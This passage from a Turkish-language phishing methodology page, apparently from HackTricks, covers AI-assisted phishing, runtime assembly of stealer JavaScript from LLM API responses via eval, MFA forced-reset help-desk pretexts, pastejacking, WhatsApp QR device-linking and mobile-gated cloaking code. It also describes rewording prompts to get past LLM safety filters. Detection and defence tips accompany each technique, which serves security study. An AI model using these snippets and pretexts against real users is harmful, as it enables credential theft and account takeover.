* Defender'lar `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'lerini ve DLL load edildikten sonraki 5 dakikalık polling aralıklarını inceleyebilir.

---

## AI-Enhanced Phishing Operations
Saldırganlar artık tamamen kişiselleştirilmiş lure'lar ve gerçek zamanlı interaction için **LLM & voice-clone APIs** zincirliyor.

| Layer | Threat actor tarafından örnek kullanım |
|-------|-------------|
|Automation|Randomized ifadeler ve tracking link'leriyle >100 k email / SMS üretip gönderme.|
|Generative AI|Public M&A'ya ve sosyal medyadaki iç şakalara atıfta bulunan *one-off* email'ler üretme; callback scam'de deep-fake CEO voice kullanma.|
|Agentic AI|Domain'leri otonom şekilde register etme, open-source intel scrape etme, victim bir link'e tıklayıp credential submit etmediğinde next-stage mail'leri hazırlama.|

**Defence:**
• Güvenilmeyen automation tarafından gönderilen mesajları (ARC/DKIM anomalies üzerinden) vurgulayan **dynamic banners** ekleyin.
• High-risk phone request'leri için **voice-biometric challenge phrases** kullanıma alın.
• Awareness programme'lerinde AI-generated lure'ları sürekli simüle edin – static template'ler artık obsolete.

Credential phishing için agentic browsing abuse konusuna da bakın:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory ve detection için AI agent'ların local CLI tools ve MCP abuse konusuna da bakın:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Saldırganlar zararsız görünen HTML gönderebilir ve **trusted LLM API**'den JavaScript isteyerek **stealer'ı runtime'da generate edebilir**, ardından bunu browser içinde çalıştırabilir (ör. `eval` veya dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Exfil URL'lerini/Base64 string'lerini prompt içine encode edin; safety filter'ları aşmak ve hallucination'ları azaltmak için ifadeleri yineleyin.
2. **Client-side API call:** Load sırasında JS, public bir LLM'yi (Gemini/DeepSeek/etc.) veya bir CDN proxy'yi çağırır; static HTML'de yalnızca prompt/API call bulunur.
3. **Assemble & exec:** Yanıtı birleştirip çalıştırır (ziyaret başına polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** oluşturulan code, lure'u kişiselleştirir (ör. LogoKit token parsing) ve creds'i prompt tarafından gizlenen endpoint'e gönderir.

**Evasion traits**
- Traffic, iyi bilinen LLM domain'lerine veya güvenilir CDN proxy'lerine ulaşır; bazen bir backend'e WebSockets üzerinden bağlanır.
- Static payload yoktur; malicious JS yalnızca render sonrasında mevcut olur.
- Non-deterministic generations, her session için **unique** stealers üretir.

**Detection ideas**
- JS etkin sandbox'lar çalıştırın; **LLM responses kaynaklı runtime `eval`/dynamic script creation** işlemlerini işaretleyin.
- LLM API'lerine yapılan front-end POST'ların hemen ardından dönen text üzerinde `eval`/`Function` kullanımını arayın.
- Client traffic içinde yetkisiz LLM domain'leri ve ardından gerçekleşen credential POST'ları için alert oluşturun.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Classic push-bombing'in yanı sıra operatörler, help-desk görüşmesi sırasında basitçe **new MFA registration'ı force eder** ve kullanıcının mevcut token'ını geçersiz kılar. Bundan sonraki herhangi bir login prompt'u kurbana legitimate görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta olaylarında **`deleteMFA` + `addMFA`** işlemlerinin **aynı IP'den dakikalar içinde** gerçekleşip gerçekleşmediğini izleyin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, güvenliği ihlal edilmiş veya typosquatted bir web sayfasından kötü amaçlı komutları kurbanın panosuna sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırması için kandırarak herhangi bir indirme veya ek olmadan keyfi kod çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing ve Kötü Amaçlı Uygulama Dağıtımı (Android ve iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR sosyal mühendisliği aracılığıyla WhatsApp device-linking hijacking
* Bir lure sayfası (ör. sahte bir bakanlık/CERT “kanalı”), bir WhatsApp Web/Desktop QR kodu görüntüler ve kurbana bunu taramasını söyleyerek saldırganı sessizce **linked device** olarak ekler.<sup>[[12]](#references)</sup>
* Saldırgan, oturum kaldırılana kadar sohbet ve kişi görünürlüğüne hemen erişim kazanır. Kurbanlar daha sonra “new device linked” bildirimi görebilir; savunucular, güvenilmeyen QR sayfalarına yapılan ziyaretlerin hemen ardından gerçekleşen beklenmeyen device-link olaylarını avlayabilir.

### Crawler'ları/sandbox'ları atlatmak için mobile-gated phishing
Operatörler, desktop crawler'larının son sayfalara hiçbir zaman ulaşamaması için phishing akışlarını giderek daha fazla basit bir device check arkasında gizliyor. Yaygın bir yöntemde, touch-capable bir DOM'u test eden ve sonucu bir server endpoint'ine gönderen küçük bir script kullanılır; mobile olmayan istemcilere HTTP 500 (veya boş bir sayfa) gönderilirken mobile kullanıcılara tam akış sunulur.<sup>[[7]](#references)</sup>

Minimal client snippet (tipik mantık):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sunucu davranışı sıklıkla şu şekilde gözlemlenir:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- `is_mobile=false` olduğunda sonraki GET isteklerine 500 (veya placeholder) döndürür; phishing içeriğini yalnızca `true` olduğunda sunar.

Hunting ve detection sezgisel kuralları:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobil olmayan istekler için HTTP 500 sıralaması; meşru mobil victim path'leri, devamındaki HTML/JS ile birlikte 200 döndürür.
- İçeriği yalnızca `ontouchstart` veya benzeri device kontrollerine göre koşullu olarak sunan sayfaları engelleyin veya incelemeye alın.

Defence ipuçları:
- Gated content'i ortaya çıkarmak için crawler'ları mobile benzeri fingerprint'ler ve etkin JS ile çalıştırın.
- Yeni kaydedilmiş domain'lerde `POST /detect` sonrasında gerçekleşen şüpheli 500 yanıtları için alarm oluşturun.

## References

- [1] [Phishing'de Kullanılan Domain Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing'i Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC Kullanarak Kimlik Bilgilerini Çalma ve 2FA'yı Bypass Etme (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC ile Oturumları Çalma ve 2FA'yı Bypass Etme (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy'de Postfix ile DKIM Nasıl Kurulur ve Yapılandırılır (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – Mobile-Gated Phishing Infrastructure and Heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks'in Yeni Sınırı: Gerçek Zamanlı Phishing JavaScript'i Üretmek için LLM'lerden Yararlanma](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking ve TDS: Bir Malware Distribution Ecosystem'inin İç Yapısı](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Windows.com Bitsquatting'i (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping ile Microsoft'un windows.com Trafiğini Hijack Etme (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Aşk mı? Aslında: Pakistan'daki Hedefli Spyware Campaign'inde Yem Olarak Kullanılan Sahte Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC'leri ve Örnekleri](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
